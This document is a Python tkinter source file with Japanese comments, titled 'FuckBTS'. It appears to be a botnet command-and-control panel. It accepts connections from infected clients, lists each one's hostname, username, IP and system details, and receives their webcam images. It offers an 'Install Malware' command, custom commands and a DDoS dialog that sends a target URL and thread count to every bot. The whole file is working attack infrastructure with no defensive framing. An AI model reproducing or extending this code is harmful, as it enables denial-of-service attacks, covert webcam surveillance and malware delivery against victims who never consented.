import tkinter as tk
from tkinter import ttk, simpledialog, messagebox
import socket
import threading
import json
import time
from datetime import datetime
from vidstream import StreamingServer
import numpy as np
import requests
import sys
import msgpack

# グローバル変数
sessions = {}
server_socket = None
server_thread = None
monitor_thread = None
capture_sessions = {} #カメラセッション情報
log_window = None
log_table = None  # ここでlog_tableを初期化

# サーバーのログを更新する関数
def log_message(status, message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    if log_table:  # log_tableが定義されている場合のみログを追加
        log_table.insert('', 'end', values=(datetime.now().strftime('%Y-%m-%d'), timestamp, status, message))
        log_table.yview_moveto(1)
    else:
        print(f"[{timestamp}] {status}: {message}")  # デバッグ用にコンソール出力も可能

# セッションテーブルの更新
def update_session_table():
    for row in session_table.get_children():
        session_table.delete(row)
    for session_id, info in sessions.items():
        session_table.insert('', 'end', values=(session_id, info['hostname'], info['username'], info['global_ip'], info['os_name'], info['os_version'], info['cpu_usage'], info['disk_usage']))

def handle_client(client_socket, addr):
    session_id = None
    try:
        data = client_socket.recv(1024)
        if not data:
            return
        initial_data = json.loads(data.decode())
        session_id = initial_data["session_id"]
        sessions[session_id] = {
            "hostname": initial_data["hostname"],
            "username": initial_data["username"],
            "global_ip": initial_data["global_ip"],
            "os_name": initial_data["os_name"],
            "os_version": initial_data["os_version"],
            "cpu_usage": initial_data["cpu_usage"],
            "disk_usage": initial_data["disk_usage"],
            "socket": client_socket,
            "addr": addr,
            "last_update": time.time()
        }
        log_message("INFO", f"Client connected with session ID: {session_id} from {addr}")
        update_session_table()

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            update_data = json.loads(data.decode())
            session_id = update_data["session_id"]
            if session_id in sessions:
                if "image" in update_data:
                    display_webcam_image(session_id, update_data["image"])
                else:
                    sessions[session_id].update({
                        "cpu_usage": update_data["cpu_usage"],
                        "disk_usage": update_data["disk_usage"],
                        "last_update": time.time()
                    })
                log_message("INFO", f"Received data from session {session_id}")
                update_session_table()
            else:
                log_message("ERROR", f"Received data from unknown session ID: {session_id}")
    except Exception as e:
        log_message("ERROR", f"Error handling client: {e}")
    finally:
        if session_id and session_id in sessions:
            log_message("INFO", f"Client disconnected with session ID: {session_id}")
            sessions[session_id]["socket"].close()
            del sessions[session_id]
            update_session_table()

def monitor_sessions():
    while server_socket:
        current_time = time.time()
        for session_id in list(sessions.keys()):
            if current_time - sessions[session_id]["last_update"] > 30:
                log_message("WARNING", f"Session ID {session_id} has been inactive for more than 30 seconds.")
                sessions[session_id]["socket"].sendall(b"exit")
                sessions[session_id]["socket"].close()
                del sessions[session_id]
                update_session_table()
        time.sleep(5)

def start_server(host='0.0.0.0', port=12345):
    global server_socket, server_thread, monitor_thread
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    log_message("INFO", f"Server started on {host}:{port}")

    def accept_clients():
        while server_socket:
            try:
                client_socket, addr = server_socket.accept()
                threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
            except OSError:
                break

    server_thread = threading.Thread(target=accept_clients, daemon=True)
    server_thread.start()

    monitor_thread = threading.Thread(target=monitor_sessions, daemon=True)
    monitor_thread.start()

def stop_server():
    global server_socket
    if server_socket:
        server_socket.close()
        server_socket = None
    if server_thread:
        server_thread.join()
    if monitor_thread:
        monitor_thread.join()

def send_to_client(session_id, message):
    if session_id in sessions:
        try:
            sessions[session_id]["socket"].sendall(message.encode())
            log_message("INFO", f"Sent message to session ID {session_id}: {message}")
        except Exception as e:
            log_message("ERROR", f"Error sending message to session ID {session_id}: {e}")
    else:
        log_message("ERROR", f"Session ID {session_id} not found for sending message.")

def send_to_all_clients(message):
    for session_id in sessions:
        try:
            sessions[session_id]["socket"].sendall(message.encode())
            log_message("INFO", f"Sent message to all clients: {message}")
        except Exception as e:
            log_message("ERROR", f"Error sending message to session ID {session_id}: {e}")

def dataproccessor(data):
    c = msgpack.packb(data)
    d = c.hex()
    return d
    

def ddos_message():
    # モーダルダイアログを作成
    modal_dialog = tk.Toplevel(root)
    modal_dialog.title("DDoS Settings")
    modal_dialog.geometry("300x150")

    # 他のウィンドウを操作できないようにする
    modal_dialog.grab_set()
    
    
    label=ttk.Label(modal_dialog, text="URL")
    label.pack()
    urlbox = ttk.Entry(modal_dialog)
    urlbox.pack()
    labelthr = ttk.Label(modal_dialog, text="スレッド数")
    labelthr.pack()
    thrlevel = ttk.Spinbox(modal_dialog, from_=1, to=9999, increment=1)
    thrlevel.pack()
    
    
    

    # OKボタンを追加して閉じる処理を設定
    ok_button = tk.Button(modal_dialog, text="OK", command=modal_dialog.destroy)
    ok_button.pack()

    # ダイアログが閉じられるまで待つ
    root.wait_window(modal_dialog)
    
    data = ['DDOS', urlbox.get(), thrlevel.get()]
    
    
    dei = dataproccessor(data)
    send_to_all_clients("all:{dei}")

def show_context_menu(event):
    try:
        item = session_table.selection()[0]
        session_id = session_table.item(item, 'values')[0]
        menu = tk.Menu(root, tearoff=0)
        menu.add_command(label="Install Malware", command=lambda: send_to_client(session_id, ""))
        menu.add_command(label="Send Custom Message", command=lambda: send_custom_message(session_id))
        menu.add_command(label="Exit Client", command=lambda: send_to_client(session_id, "exit"))
        menu.post(event.x_root, event.y_root)
    except IndexError:
        log_message("WARNING", "Session is None")

def send_custom_message(session_id):
    message = simpledialog.askstring("Send Message", f"Enter message for session ID {session_id}:")
    if message:
        send_to_client(session_id, message)

def show_log_window():
    global log_window, log_table
    if log_window is None or not tk.Toplevel.winfo_exists(log_window):
        log_window = tk.Toplevel(root)
        log_window.title("Log Table")

        log_table_frame = tk.Frame(log_window)
        log_table_frame.pack(fill='both', expand=True)

        log_table = ttk.Treeview(log_table_frame, columns=("date", "time", "status", "message"), show='headings')
        log_table.heading("date", text="Date")
        log_table.heading("time", text="Time")
        log_table.heading("status", text="Status")
        log_table.heading("message", text="Message")
        log_table.pack(fill='both', expand=True)
    else:
        log_window.deiconify()  # ウィンドウを再表示

def show_ver_window():
    messagebox.showinfo("About FuckBTS", "FuckBTS ver.0.0.0")

def on_closing():
    stop_server()
    root.destroy()

root = tk.Tk()
root.title("FuckBTS ver.0.0.0")

# メニューバーの作成
menu_bar = tk.Menu(root)
root.config(menu=menu_bar)

system_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="System", menu=system_menu)
system_menu.add_command(label="Open Log Window", command=show_log_window)
system_menu.add_command(label="DDOS", command=ddos_message)
system_menu.add_command(label="Version", command=show_ver_window)

frame = tk.Frame(root)
frame.pack(fill='both', expand=True)

session_table = ttk.Treeview(frame, columns=("session_id", "hostname", "username", "global_ip", "os_name", "os_version", "cpu_usage", "disk_usage"), show='headings')
session_table.heading("session_id", text="Session ID")
session_table.heading("hostname", text="Hostname")
session_table.heading("username", text="Username")
session_table.heading("global_ip", text="Global IP")
session_table.heading("os_name", text="OS Name")
session_table.heading("os_version", text="OS Version")
session_table.heading("cpu_usage", text="CPU Usage (%)")
session_table.heading("disk_usage", text="Disk Usage (%)")
session_table.pack(fill='both', expand=True, side='left')

session_table.bind("<Button-3>", show_context_menu)

start_server()

root.protocol("WM_DELETE_WINDOW", on_closing)
root.mainloop()
